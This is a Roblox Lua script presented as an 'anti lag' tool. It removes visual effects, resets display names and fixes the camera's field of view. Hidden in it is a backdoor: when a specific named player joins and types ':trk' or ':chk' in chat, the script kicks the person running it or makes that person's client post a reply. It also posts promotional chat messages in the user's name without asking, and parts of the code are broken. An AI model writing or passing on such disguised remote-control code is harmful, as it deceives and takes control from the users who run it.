local Players = game:GetService("Players")
local Player = game:GetService('Players').LocalPlayer or game:GetService('Players'):WaitForChild(LocalPlayer)
local runservice = game:GetService('RunService')
local safe = CFrame.new(93486234289567190, 123490821468906714000, 134891670418940198908)
local ann = false
for i,descendant in game.Workspace:GetDescendants() do
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
            descendant.DisplayName = 'made by fiji#0'
        end
	end
end

local function onDescendantAdded(descendant)
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
            descendant.DisplayName = 'made by fiji#0'
        end
	end
end

rchat = function(Message)
  Players:Chat(Message)
end

if ann == false then
local ann = true
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("1ucd is better","all")
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded fiji's anti lag","all")
local ann = true
end
for i,v in game.Players:GetChildren() do
	local signal = v.Character.Humanoid:GetPropertyChangedSignal("DisplayName")
	signal:Connect(function()
		if #v.Character.Humanoid.DisplayName>50 then
			v.Character.Humanoid.DisplayName = 'made by 0megaa.#0'
		end
	end)
end
game.Players.PlayerAdded:Connect(function(plr)
	if plr.Name == '0lxad' then
		print("Daddy found!")
		local Daddy = plr
		Daddy.Chatted:Connect(function(msg)
    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
      			if Player.Name == '0lxad' then print("Skids kicked")
      			else
        		local kmsg = string.split(msg, ':trk')[1]
            	Player:Kick(kmsg)
      			end
    		end
		end)
        Daddy.Chatted:Connect(function(msg)
            if string.lower(msg) == ":chk" then
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("I am!","all")
			end
        end)
	end
end)
workspace.DescendantAdded:Connect(onDescendantAdded)
game.Chat.BubbleChatEnabled = false
coroutine.wrap(function()
runservice.PostSimulation:Connect(function()
    for i,v in pairs(workspace:GetDescendants())do
        if v.Name=='Mesh' or v.Name=='SpecialMesh' or v.ClassName=='ParticleEmitter' or v.ClassName=='Smoke' then
            if v.Parent.Name~='Head' and v.Parent.Name~='Handle' then
                if not v:IsDescendantOf(Workspace.SecureParts) then
                    v:Destroy()
                end
            end
	    elseif v.ClassName == 'SkateboardPlatform' then
			if v.Position ~= safe then
            	v.CFrame = safe
            	v.Name = 'NoBoard xd'
			end
        end
    end
	if workspace.Camera.FieldOfView ~= 70 then
		workspace.Camera.FieldOfView = 70
	end
end)
end)()

coroutine.wrap(function()
while wait(0.7) do
	for i,v in Players do 
		if v:FindFirstChild('Character') and v.Character:FindFirstChild('Humanoid') then 
			v.Character.Humanoid.DisplayName = v.Name
		end
	end
end)()
